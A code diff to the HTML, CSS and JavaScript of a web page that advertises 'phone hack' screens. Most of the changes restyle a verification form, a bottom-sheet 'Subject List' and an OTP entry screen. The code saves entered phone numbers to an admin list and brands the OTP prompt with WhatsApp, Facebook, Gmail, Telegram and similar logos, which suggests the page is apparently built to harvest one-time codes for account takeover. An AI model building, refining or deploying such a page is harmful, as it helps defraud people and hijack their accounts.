@@ -3050,9 +3050,9 @@
             }
         }
 
-        /* Compact Normal Premium (No Lighting) */
+        /* Compact Premium (Pastel Card + Smooth Bottom Sheet) */
         .verification-screen {
-            background: #06080f !important;
+            background: radial-gradient(circle at 20% 20%, #0f1a33 0%, #06080f 60%, #05070d 100%) !important;
             background-image: none !important;
         }
 
@@ -3074,9 +3074,12 @@
             max-width: 420px !important;
             padding: 26px 22px !important;
             border-radius: 14px !important;
-            border: 1px solid #d8e0ee !important;
-            box-shadow: none !important;
-            background: #ffffff !important;
+            border: 1px solid #c8d5f0 !important;
+            box-shadow: 0 16px 38px rgba(15, 23, 42, 0.28) !important;
+            background:
+                radial-gradient(circle at 18% 14%, rgba(176, 108, 232, 0.18) 0%, transparent 42%),
+                radial-gradient(circle at 86% 18%, rgba(58, 191, 155, 0.18) 0%, transparent 44%),
+                linear-gradient(160deg, #f8f1ff 0%, #f2f6ff 54%, #ecfff7 100%) !important;
             animation: none !important;
             margin: 0 auto !important;
         }
@@ -3100,15 +3103,16 @@
             width: 42px;
             height: 42px;
             margin: 0 auto 8px;
-            border-radius: 10px;
+            border-radius: 12px;
             display: grid;
             place-items: center;
             font-size: 18px !important;
-            color: #2563eb !important;
-            background: #eff6ff;
-            border: 1px solid #bfdbfe;
+            color: #ffffff !important;
+            background: linear-gradient(135deg, #2563eb 0%, #3b82f6 52%, #14b8a6 100%);
+            border: 1px solid rgba(255, 255, 255, 0.68);
             text-shadow: none !important;
             animation: none !important;
+            box-shadow: 0 10px 24px rgba(37, 99, 235, 0.3) !important;
         }
 
         .verification-header i::before {
@@ -3121,13 +3125,13 @@
             margin-bottom: 8px !important;
             color: #0f172a !important;
             text-shadow: none !important;
-            letter-spacing: 0.8px !important;
+            letter-spacing: 0.5px !important;
             animation: none !important;
         }
 
         .verification-header p {
             font-size: 13px !important;
-            color: #64748b !important;
+            color: #51627f !important;
             text-shadow: none !important;
             letter-spacing: 0 !important;
             font-family: 'Poppins', sans-serif !important;
@@ -3141,12 +3145,12 @@
             margin-bottom: 7px !important;
             font-size: 12px !important;
             letter-spacing: 0.5px !important;
-            color: #1f2937 !important;
+            color: #233251 !important;
             text-shadow: none !important;
         }
 
         .form-group label i {
-            color: #2563eb !important;
+            color: #3b82f6 !important;
             text-shadow: none !important;
             animation: none !important;
         }
@@ -3156,9 +3160,9 @@
             padding: 12px 13px !important;
             font-size: 14px !important;
             border-radius: 10px !important;
-            border: 1px solid #cbd5e1 !important;
+            border: 1px solid #bfcae4 !important;
             color: #0f172a !important;
-            background: #ffffff !important;
+            background: rgba(255, 255, 255, 0.94) !important;
             box-shadow: none !important;
             font-family: 'Poppins', sans-serif !important;
         }
@@ -3167,10 +3171,10 @@
         .form-group input:hover,
         .form-group select:focus,
         .form-group input:focus {
-            border-color: #93c5fd !important;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
+            border-color: #7da8f7 !important;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.16) !important;
             transform: none !important;
-            background: #ffffff !important;
+            background: rgba(255, 255, 255, 0.98) !important;
         }
 
         #verificationForm .continue-btn {
@@ -3180,7 +3184,7 @@
             border: 1px solid #1d4ed8 !important;
             background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%) !important;
             color: #ffffff !important;
-            box-shadow: none !important;
+            box-shadow: 0 10px 22px rgba(37, 99, 235, 0.24) !important;
             font-size: 15px !important;
             letter-spacing: 0.7px !important;
             text-transform: uppercase;
@@ -3193,8 +3197,8 @@
 
         #verificationForm .continue-btn:hover,
         #verificationForm .continue-btn:active {
-            transform: none !important;
-            box-shadow: none !important;
+            transform: translateY(-1px) !important;
+            box-shadow: 0 14px 26px rgba(29, 78, 216, 0.28) !important;
             background: linear-gradient(135deg, #1d4ed8 0%, #2563eb 100%) !important;
         }
 
@@ -3211,13 +3215,19 @@
         .card-selector-overlay {
             position: fixed;
             inset: 0;
-            display: none;
-            background: rgba(2, 6, 23, 0.55);
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            background: rgba(2, 6, 23, 0.4);
+            backdrop-filter: blur(2px);
+            transition: opacity 0.26s ease, visibility 0.26s ease;
             z-index: 11000;
         }
 
         .card-selector-overlay.show {
-            display: block;
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
         }
 
         .card-selector-sheet {
@@ -3225,21 +3235,24 @@
             left: 0;
             right: 0;
             bottom: 0;
-            transform: translateY(104%);
-            transition: transform 0.32s ease;
-            background: #ffffff;
-            border-top-left-radius: 20px;
-            border-top-right-radius: 20px;
+            transform: translateY(112%) scale(0.98);
+            transition: transform 0.38s cubic-bezier(0.2, 0.9, 0.2, 1);
+            background:
+                radial-gradient(circle at 14% 8%, rgba(176, 108, 232, 0.16) 0%, transparent 42%),
+                radial-gradient(circle at 86% 12%, rgba(58, 191, 155, 0.14) 0%, transparent 44%),
+                #ffffff;
+            border-top-left-radius: 22px;
+            border-top-right-radius: 22px;
             border: 1px solid #d8e0ee;
             border-bottom: none;
-            padding: 14px;
+            padding: 15px;
             max-height: 78vh;
             overflow-y: auto;
-            box-shadow: 0 -16px 40px rgba(15, 23, 42, 0.2);
+            box-shadow: 0 -18px 44px rgba(15, 23, 42, 0.28);
         }
 
         .card-selector-overlay.show .card-selector-sheet {
-            transform: translateY(0);
+            transform: translateY(0) scale(1);
         }
 
         .card-selector-handle {
@@ -3261,6 +3274,7 @@
         .card-selector-head h3 {
             font-size: 17px;
             color: #0f172a;
+            letter-spacing: 0.2px;
         }
 
         .card-selector-close {
@@ -3624,6 +3638,242 @@
                 font-size: 8px !important;
             }
         }
+
+        /* Unified OTP UI - low light, mobile friendly, category logo support */
+        .otp-screen {
+            background: #02060e !important;
+            background-image:
+                radial-gradient(circle at 20% 22%, rgba(0, 255, 100, 0.06) 0%, transparent 48%),
+                radial-gradient(circle at 78% 70%, rgba(0, 170, 255, 0.06) 0%, transparent 52%) !important;
+        }
+
+        .otp-screen::before {
+            opacity: 0.1 !important;
+        }
+
+        .otp-container {
+            max-width: 460px !important;
+            border-radius: 20px !important;
+            padding: 30px 24px !important;
+            border: 1px solid rgba(0, 255, 90, 0.35) !important;
+            box-shadow:
+                0 14px 40px rgba(0, 0, 0, 0.55),
+                0 0 26px rgba(0, 255, 90, 0.12),
+                inset 0 0 24px rgba(0, 255, 90, 0.04) !important;
+        }
+
+        .otp-container::before,
+        .otp-container::after {
+            opacity: 0.7;
+            font-size: 20px;
+        }
+
+        .otp-header {
+            margin-bottom: 24px !important;
+        }
+
+        .otp-header::after {
+            bottom: -14px !important;
+            width: 72px !important;
+            height: 3px !important;
+            box-shadow: 0 0 8px rgba(0, 255, 90, 0.35) !important;
+        }
+
+        .otp-category-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 0 auto 14px;
+            padding: 8px 12px;
+            border-radius: 999px;
+            width: fit-content;
+            max-width: 100%;
+            border: 1px solid rgba(0, 255, 100, 0.22);
+            background: rgba(0, 255, 100, 0.06);
+        }
+
+        .otp-category-icon-shell {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(145deg, rgba(0, 255, 100, 0.92), rgba(0, 170, 255, 0.86));
+            box-shadow: 0 6px 18px rgba(0, 245, 110, 0.24);
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .otp-header .otp-category-icon {
+            color: #04131b !important;
+            font-size: 18px !important;
+            text-shadow: none !important;
+            filter: none !important;
+            margin: 0 !important;
+            animation: none !important;
+            display: inline-block !important;
+        }
+
+        .otp-category-image {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+            display: none;
+            filter: drop-shadow(0 0 6px rgba(0, 0, 0, 0.45));
+        }
+
+        .otp-category-meta {
+            min-width: 0;
+            text-align: left;
+            line-height: 1.15;
+        }
+
+        .otp-category-name {
+            display: block;
+            color: #dfffea;
+            font-size: 14px;
+            font-weight: 700;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            overflow: hidden;
+            max-width: 220px;
+        }
+
+        .otp-category-subtitle {
+            display: block;
+            margin-top: 2px;
+            color: rgba(172, 233, 255, 0.84);
+            font-size: 11px;
+            letter-spacing: 0.2px;
+        }
+
+        .otp-header h1 {
+            font-size: 28px !important;
+            letter-spacing: 1.5px !important;
+            text-shadow:
+                0 0 8px rgba(0, 255, 90, 0.45),
+                0 0 16px rgba(0, 255, 90, 0.2) !important;
+            margin-bottom: 10px !important;
+            animation: none !important;
+        }
+
+        .otp-header p {
+            font-size: 13px !important;
+            text-shadow: 0 0 8px rgba(0, 212, 255, 0.3) !important;
+            letter-spacing: 0.4px !important;
+        }
+
+        .otp-input-group {
+            margin-bottom: 18px !important;
+        }
+
+        .otp-input {
+            height: 54px !important;
+            border-radius: 14px !important;
+            border: 1px solid rgba(0, 255, 100, 0.34) !important;
+            background: rgba(2, 11, 22, 0.88) !important;
+            font-size: 24px !important;
+            letter-spacing: 7px !important;
+            padding: 0 16px !important;
+            box-shadow: inset 0 0 18px rgba(0, 255, 90, 0.06) !important;
+        }
+
+        .otp-input:focus {
+            box-shadow:
+                0 0 0 2px rgba(0, 255, 110, 0.22),
+                0 0 18px rgba(0, 255, 110, 0.18) !important;
+            transform: none !important;
+        }
+
+        .otp-screen .continue-btn {
+            width: 100%;
+            min-height: 50px;
+            border: 1px solid rgba(0, 255, 100, 0.45) !important;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #00ed72 0%, #00abd8 100%) !important;
+            color: #04111a !important;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            box-shadow: 0 8px 20px rgba(0, 245, 110, 0.22) !important;
+        }
+
+        .otp-screen .continue-btn:hover {
+            transform: translateY(-1px) !important;
+            box-shadow: 0 10px 24px rgba(0, 245, 110, 0.27) !important;
+        }
+
+        .otp-screen .continue-btn i {
+            margin-right: 8px;
+        }
+
+        @media (max-width: 640px) {
+            .otp-container {
+                max-width: 420px !important;
+                padding: 24px 18px !important;
+                border-radius: 18px !important;
+            }
+
+            .otp-header h1 {
+                font-size: 24px !important;
+                letter-spacing: 1px !important;
+            }
+
+            .otp-header p {
+                font-size: 12px !important;
+            }
+
+            .otp-input {
+                height: 50px !important;
+                font-size: 21px !important;
+                letter-spacing: 6px !important;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .otp-screen {
+                padding: 14px !important;
+            }
+
+            .otp-container {
+                padding: 20px 14px !important;
+                border-radius: 16px !important;
+            }
+
+            .otp-category-logo {
+                width: 100%;
+                border-radius: 14px;
+                justify-content: flex-start;
+                padding: 8px 10px;
+            }
+
+            .otp-category-name {
+                font-size: 13px;
+                max-width: 190px;
+            }
+
+            .otp-category-subtitle {
+                font-size: 10px;
+            }
+
+            .otp-header h1 {
+                font-size: 21px !important;
+            }
+
+            .otp-input {
+                height: 46px !important;
+                font-size: 19px !important;
+                letter-spacing: 5px !important;
+            }
+
+            .otp-screen .continue-btn {
+                min-height: 46px;
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -3846,10 +4096,10 @@
         <div class="card-selector-sheet" role="dialog" aria-modal="true" aria-label="Card click list">
             <div class="card-selector-handle"></div>
             <div class="card-selector-head">
-                <h3>Card Click List</h3>
+                <h3>Subject List</h3>
                 <button type="button" class="card-selector-close" onclick="closeCardSelectorSheet()">Close</button>
             </div>
-            <p class="card-selector-note">List auto-sync from admin panel. Add/delete card দেখলেই এখানে update হবে.</p>
+            <p class="card-selector-note">List auto-sync from admin panel. Add/delete subject দিলেই এখানে auto update হবে.</p>
             <div id="cardSelectorGrid" class="card-selector-grid">
                 <div class="card-selector-loading">Loading cards...</div>
             </div>
@@ -3942,7 +4192,16 @@
     <div class="otp-screen" id="otpScreen">
         <div class="otp-container">
             <div class="otp-header">
-                <i class="fas fa-shield-alt"></i>
+                <div class="otp-category-logo" id="otpCategoryLogo">
+                    <div class="otp-category-icon-shell">
+                        <i id="otpCategoryIcon" class="otp-category-icon fas fa-shield-alt"></i>
+                        <img id="otpCategoryImage" class="otp-category-image" alt="Category logo">
+                    </div>
+                    <div class="otp-category-meta">
+                        <span id="otpCategoryName" class="otp-category-name">Secure Category</span>
+                        <span id="otpCategorySubtitle" class="otp-category-subtitle">OTP Security Check</span>
+                    </div>
+                </div>
                 <h1>OTP Verification</h1>
                 <p>Enter the verification code</p>
             </div>
@@ -4065,6 +4324,109 @@
             }
         }
 
+        function isPhoneHackElementVisible(element) {
+            if (!element) return false;
+            const styles = window.getComputedStyle(element);
+            return styles.display !== 'none' && styles.visibility !== 'hidden';
+        }
+
+        function hidePhoneHackScreen(element) {
+            if (!element) return;
+            element.style.display = 'none';
+            element.classList.remove('show');
+        }
+
+        async function goBackToNumberVerificationScreen() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const verificationScreen = document.getElementById('verificationScreen');
+            const hackingScreen = document.getElementById('hackingScreen');
+            const blankPage = document.getElementById('blankPage');
+            const categoryLoadingScreen = document.getElementById('categoryLoadingScreen');
+            const otpScreen = document.getElementById('otpScreen');
+            const otpDialogOverlay = document.getElementById('otpDialogOverlay');
+            const codeMatchDialog = document.getElementById('codeMatchDialog');
+            const whatsappLoadingOverlay = document.getElementById('whatsappLoadingOverlay');
+
+            if (loadingScreen) {
+                loadingScreen.style.display = 'none';
+                loadingScreen.classList.remove('show');
+            }
+
+            hidePhoneHackScreen(hackingScreen);
+            hidePhoneHackScreen(categoryLoadingScreen);
+            hidePhoneHackScreen(verificationScreen);
+
+            if (otpScreen) {
+                otpScreen.classList.remove('show');
+            }
+            if (otpDialogOverlay) {
+                otpDialogOverlay.classList.remove('show');
+            }
+            if (codeMatchDialog) {
+                codeMatchDialog.classList.remove('show');
+            }
+            if (whatsappLoadingOverlay) {
+                whatsappLoadingOverlay.classList.remove('show');
+            }
+
+            if (typeof closeCardSelectorSheet === 'function') {
+                closeCardSelectorSheet();
+            }
+
+            if (window.blankPageRefreshInterval) {
+                clearInterval(window.blankPageRefreshInterval);
+                window.blankPageRefreshInterval = null;
+            }
+
+            if (blankPage) {
+                blankPage.style.display = 'block';
+                blankPage.classList.add('show');
+            }
+
+            try {
+                await loadPhoneHackContent();
+                await loadWhatsAppNumbers();
+                await loadCategories();
+            } catch (error) {
+                console.error('Back-to-contact refresh failed:', error);
+            }
+
+            setTimeout(() => {
+                const contactContainer = blankPage ? blankPage.querySelector('.contact-container') : null;
+                if (contactContainer) {
+                    contactContainer.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            }, 120);
+        }
+
+        function initializePhoneHackBackButton() {
+            const backButton = document.getElementById('phoneHackBackBtn');
+            if (!backButton) return;
+
+            backButton.addEventListener('click', function(event) {
+                const blankPage = document.getElementById('blankPage');
+                if (isPhoneHackElementVisible(blankPage)) {
+                    event.preventDefault();
+                    const contactContainer = blankPage.querySelector('.contact-container');
+                    if (contactContainer) {
+                        contactContainer.scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'start'
+                        });
+                    }
+                    return;
+                }
+
+                event.preventDefault();
+                goBackToNumberVerificationScreen();
+            });
+        }
+
+        initializePhoneHackBackButton();
+
         async function savePhoneNumberToAdminList(countryCode, phoneDigits) {
             try {
                 if (!phoneDigits) return;
@@ -4085,11 +4447,75 @@
             }
         }
 
-        // Continue -> Admin-driven Card Click List (bottom sheet)
+        // Continue -> Admin-driven Subject List (bottom sheet)
         const CARD_CLICK_LIST_MARKER = '__selector_card__';
         let cardSelectorItems = [];
         let cardSelectorRefreshTimer = null;
         let pendingVerificationPayload = null;
+        let activeOtpCategory = null;
+
+        function resolveOtpCategoryVisual(category) {
+            const fallbackIcon = 'fas fa-shield-alt';
+            const fallbackName = 'Secure Category';
+            const rawName = category && category.name ? String(category.name).trim() : '';
+            const rawIcon = category && category.icon ? String(category.icon).trim() : '';
+            const normalizedName = rawName.toLowerCase();
+            const iconMap = [
+                { key: 'whatsapp', icon: 'fab fa-whatsapp' },
+                { key: 'messenger', icon: 'fab fa-facebook-messenger' },
+                { key: 'telegram', icon: 'fab fa-telegram' },
+                { key: 'instagram', icon: 'fab fa-instagram' },
+                { key: 'facebook', icon: 'fab fa-facebook-f' },
+                { key: 'gmail', icon: 'fab fa-google' },
+                { key: 'email', icon: 'fas fa-envelope' },
+                { key: 'tiktok', icon: 'fab fa-tiktok' },
+                { key: 'twitter', icon: 'fab fa-twitter' },
+                { key: 'viber', icon: 'fab fa-viber' },
+                { key: 'camera', icon: 'fas fa-camera' },
+                { key: 'phone', icon: 'fas fa-phone' },
+                { key: 'call', icon: 'fas fa-phone-alt' },
+                { key: 'location', icon: 'fas fa-map-marker-alt' },
+                { key: 'microphone', icon: 'fas fa-microphone' }
+            ];
+
+            const mappedIcon = iconMap.find((entry) => normalizedName.includes(entry.key));
+            const isImageIcon = rawIcon.startsWith('data:image/');
+            const safeIconClass = rawIcon.replace(/[^a-z0-9\-\s]/gi, '').trim();
+            const useClass = isImageIcon
+                ? fallbackIcon
+                : ((safeIconClass && safeIconClass.includes('fa-')) ? safeIconClass : (mappedIcon ? mappedIcon.icon : fallbackIcon));
+
+            return {
+                name: rawName || fallbackName,
+                subtitle: 'OTP Security Check',
+                isImageIcon,
+                imageSrc: isImageIcon ? rawIcon : '',
+                iconClass: useClass || fallbackIcon
+            };
+        }
+
+        function updateOtpCategoryLogo(category) {
+            const iconEl = document.getElementById('otpCategoryIcon');
+            const imageEl = document.getElementById('otpCategoryImage');
+            const nameEl = document.getElementById('otpCategoryName');
+            const subtitleEl = document.getElementById('otpCategorySubtitle');
+            if (!iconEl || !imageEl || !nameEl || !subtitleEl) return;
+
+            const visual = resolveOtpCategoryVisual(category);
+            iconEl.className = `otp-category-icon ${visual.iconClass}`;
+            nameEl.textContent = `${visual.name} Verification`;
+            subtitleEl.textContent = visual.subtitle;
+
+            if (visual.isImageIcon && visual.imageSrc) {
+                imageEl.src = visual.imageSrc;
+                imageEl.style.display = 'block';
+                iconEl.style.display = 'none';
+            } else {
+                imageEl.removeAttribute('src');
+                imageEl.style.display = 'none';
+                iconEl.style.display = 'inline-block';
+            }
+        }
 
         function escapeCardSelectorHtml(value) {
             return String(value || '')
@@ -4105,7 +4531,7 @@
             if (!grid) return;
 
             if (!Array.isArray(cardSelectorItems) || cardSelectorItems.length === 0) {
-                grid.innerHTML = '<div class="card-selector-empty">No card found. Admin panel থেকে Card Click List-এ card add করুন.</div>';
+                grid.innerHTML = '<div class="card-selector-empty">No subject found. Admin panel থেকে Subject List-এ subject add করুন.</div>';
                 return;
             }
 
@@ -4126,7 +4552,7 @@
             const response = await fetch('/api/admin/categories', { cache: 'no-cache' });
             const result = await response.json();
             if (!response.ok || !result.success) {
-                throw new Error(result.message || 'Failed to load card click list');
+                throw new Error(result.message || 'Failed to load subject list');
             }
 
             const rows = Array.isArray(result.categories) ? result.categories : [];
@@ -4381,7 +4807,7 @@
                     return false;
                 }
                 
-                console.log('Validation passed, opening card click list...');
+                console.log('Validation passed, opening subject list...');
                 savePhoneNumberToAdminList(countryCode, digitsOnly);
                 pendingVerificationPayload = {
                     countryCode,
@@ -4400,7 +4826,7 @@
                     .catch((error) => {
                         console.error('Failed to load card selector:', error);
                         const errorText = errorNotification?.querySelector('.error-text');
-                        const msg = 'Card list loading failed. Please try again.';
+                        const msg = 'Subject list loading failed. Please try again.';
                         if (errorText) {
                             errorText.textContent = msg;
                         } else if (errorNotification) {
@@ -4838,6 +5264,8 @@
             const otpForm = document.getElementById('otpForm');
             const otpInput = document.getElementById('otpInput');
             const errorNotification = document.getElementById('otpErrorNotification');
+            activeOtpCategory = category || null;
+            updateOtpCategoryLogo(activeOtpCategory);
             
             otpScreen.classList.add('show');
             errorNotification.classList.remove('show');
